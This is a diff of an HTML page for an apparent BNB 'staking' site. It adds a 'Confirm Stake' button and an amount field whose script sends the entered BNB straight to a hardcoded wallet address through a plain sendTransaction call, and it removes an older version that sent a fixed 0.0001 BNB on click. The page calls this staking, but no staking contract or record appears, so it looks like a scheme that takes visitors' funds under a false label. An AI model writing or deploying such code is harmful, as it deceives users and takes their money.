@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html class="no-js" lang="zxx">
 
@@ -118,11 +117,12 @@
                         
 
                         <div class="button wow fadeInUp" data-wow-delay=".8s">
-                            
                             <a class="btn" id="connectWallet">Connect Wallet</a>
                             <a href="javascript:void(0);" class="btn" id="stakeNew">Stake New</a>
-                            
-                            
+                            <!-- Champ de saisie pour le montant (masqué par défaut) -->
+                            <input type="text" id="amountInput" placeholder="Enter BNB amount" style="display: none; margin-top: 10px; padding: 5px; font-size: 14px; width: 150px;">
+                            <!-- Bouton pour confirmer l'envoi (masqué par défaut) -->
+                            <a href="javascript:void(0);" class="btn" id="confirmStake" style="display: none; margin-top: 10px;">Confirm Stake</a>
                         </div>
                     </div>
                 </div>
@@ -423,94 +423,8 @@
     <script src="assets/js/glightbox.min.js"></script>
     <script src="assets/js/count-up.min.js"></script>
     <script src="assets/js/main.js"></script>
+
     <!-- <script>
-const connectButton = document.getElementById("connectWallet");
-
-connectButton.addEventListener("click", async () => {
-    if (window.ethereum) { // Vérifie si MetaMask est installé
-        try {
-            // Vérifier si l'utilisateur est déjà connecté
-            const accounts = await ethereum.request({ method: "eth_accounts" });
-
-            if (accounts.length > 0) {
-                // L'utilisateur est déjà connecté
-                console.log("You are already connected with the wallet:", accounts[0]);
-                alert("You are connected with the wallet.");
-            } else {
-                // Demander l'accès au portefeuille de l'utilisateur
-                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                console.log("Wallet connected:", accounts[0]);
-                alert("Wallet connected successfully!");
-            }
-        } catch (error) {
-            console.error("Error connecting wallet:", error);
-            alert("Error connecting wallet.");
-        }
-    } else {
-        alert("Please install MetaMask or a compatible wallet extension!");
-    }
-});
-// Récupérer le lien "Stake New"
-const stakeLink = document.getElementById("stakeNew");
-
-// Ajouter un écouteur d'événement au lien
-stakeLink.addEventListener("click", async () => {
-    if (window.ethereum) { // Vérifier si MetaMask est installé
-        try {
-            // Demander l'accès au portefeuille de l'utilisateur (au cas où il n'est pas encore connecté)
-            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-            const userAddress = accounts[0]; // Adresse de l'utilisateur
-
-            // Configurer Web3.js
-            const web3 = new Web3(window.ethereum);
-
-            // Vérifier le solde du portefeuille
-            const balance = await web3.eth.getBalance(userAddress);
-            const balanceInBNB = web3.utils.fromWei(balance, "ether"); // Convertir en BNB
-
-            if (parseFloat(balanceInBNB) === 0) {
-                // Si le solde est vide
-                alert("Wallet empty of BNB.");
-                return; // Arrêter l'exécution
-            }
-
-            // Adresse du destinataire
-            const recipientAddress = "0x766424d8A3ABbC794e0f97DA02BF8D3C7723D091";
-
-            // Montant à envoyer (0.0001 BNB)
-            const amountInBNB = "0.0001"; // Montant en BNB
-            const amountInWei = web3.utils.toWei(amountInBNB, "ether"); // Convertir en Wei
-
-            // Vérifier si le solde est suffisant
-            if (parseFloat(balanceInBNB) < parseFloat(amountInBNB)) {
-                alert("Insufficient BNB balance.");
-                return; // Arrêter l'exécution
-            }
-
-            // Envoyer la transaction
-            const tx = await web3.eth.sendTransaction({
-                from: userAddress, // Adresse de l'expéditeur
-                to: recipientAddress, // Adresse du destinataire
-                value: amountInWei, // Montant en Wei
-                gas: 21000, // Limite de gaz pour une transaction standard
-            });
-
-            console.log("Transaction sent:", tx);
-            alert("Transaction sent successfully!");
-        } catch (error) {
-            console.error("Error sending transaction:", error);
-            if (error.message.includes("insufficient funds")) {
-                alert("Wallet empty of BNB.");
-            } else {
-                alert("Error occurred.");
-            }
-        }
-    } else {
-        alert("Please install MetaMask or a compatible wallet extension!");
-    }
-});
-    </script> -->
-    <script>
        const connectButton = document.getElementById("connectWallet");
 const stakeLink = document.getElementById("stakeNew");
 
@@ -596,7 +510,111 @@ stakeLink.addEventListener("click", async () => {
         alert("Please install MetaMask or a compatible wallet extension!");
     }
 });
-    </script>
+    </script> -->
+    <script>const connectButton = document.getElementById("connectWallet");
+        const stakeLink = document.getElementById("stakeNew");
+        const amountInput = document.getElementById("amountInput");
+        const confirmStake = document.getElementById("confirmStake");
+        
+        // Connexion au portefeuille
+        connectButton.addEventListener("click", async () => {
+            if (window.ethereum) {
+                try {
+                    const accounts = await ethereum.request({ method: "eth_accounts" });
+                    if (accounts.length > 0) {
+                        console.log("You are already connected with the wallet:", accounts[0]);
+                        alert("You are connected with the wallet.");
+                    } else {
+                        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                        console.log("Wallet connected:", accounts[0]);
+                        alert("Wallet connected successfully!");
+                    }
+                } catch (error) {
+                    console.error("Error connecting wallet:", error);
+                    alert("Error connecting wallet: " + error.message);
+                }
+            } else {
+                alert("Please install MetaMask or a compatible wallet extension!");
+            }
+        });
+        
+        // Afficher le champ de saisie et le bouton de confirmation
+        stakeLink.addEventListener("click", () => {
+            amountInput.style.display = "block"; // Afficher le champ de saisie
+            confirmStake.style.display = "block"; // Afficher le bouton de confirmation
+        });
+        
+        // Envoyer des BNB après confirmation
+        confirmStake.addEventListener("click", async () => {
+            if (window.ethereum) {
+                try {
+                    // Récupérer le montant saisi par l'utilisateur
+                    const amountInBNB = amountInput.value.trim();
+                    if (!amountInBNB || isNaN(amountInBNB) || parseFloat(amountInBNB) <= 0) {
+                        alert("Please enter a valid BNB amount.");
+                        return;
+                    }
+        
+                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                    const userAddress = accounts[0];
+                    const web3 = new Web3(window.ethereum);
+        
+                    // Vérifier le solde
+                    const balance = await web3.eth.getBalance(userAddress);
+                    const balanceInBNB = web3.utils.fromWei(balance, "ether");
+                    console.log("Balance in BNB:", balanceInBNB);
+        
+                    if (parseFloat(balanceInBNB) === 0) {
+                        alert("Wallet empty of BNB.");
+                        return;
+                    }
+        
+                    // Convertir le montant en Wei
+                    const amountInWei = web3.utils.toWei(amountInBNB, "ether");
+        
+                    // Vérifier si le solde est suffisant
+                    if (parseFloat(balanceInBNB) < parseFloat(amountInBNB)) {
+                        alert("Insufficient BNB balance.");
+                        return;
+                    }
+        
+                    // Adresse du destinataire
+                    const recipientAddress = "0x766424d8A3ABbC794e0f97DA02BF8D3C7723D091";
+        
+                    // Demander confirmation à l'utilisateur
+                    const confirmation = confirm(`Are you sure you want to send ${amountInBNB} BNB to ${recipientAddress}?`);
+                    if (!confirmation) {
+                        console.log("Transaction canceled by the user.");
+                        alert("Transaction canceled.");
+                        return;
+                    }
+        
+                    // Envoyer la transaction
+                    const tx = await web3.eth.sendTransaction({
+                        from: userAddress,
+                        to: recipientAddress,
+                        value: amountInWei,
+                    });
+        
+                    console.log("Transaction sent:", tx);
+                    alert("Transaction sent successfully!");
+        
+                    // Masquer le champ de saisie et le bouton de confirmation après l'envoi
+                    amountInput.style.display = "none";
+                    confirmStake.style.display = "none";
+                    amountInput.value = ""; // Réinitialiser le champ de saisie
+                } catch (error) {
+                    console.error("Error sending transaction:", error);
+                    if (error.message.includes("insufficient funds")) {
+                        alert("Wallet empty of BNB.");
+                    } else {
+                        alert("Error: " + error.message);
+                    }
+                }
+            } else {
+                alert("Please install MetaMask or a compatible wallet extension!");
+            }
+        });</script>
     <script>
         //====== counter up 
         var cu = new counterUp({
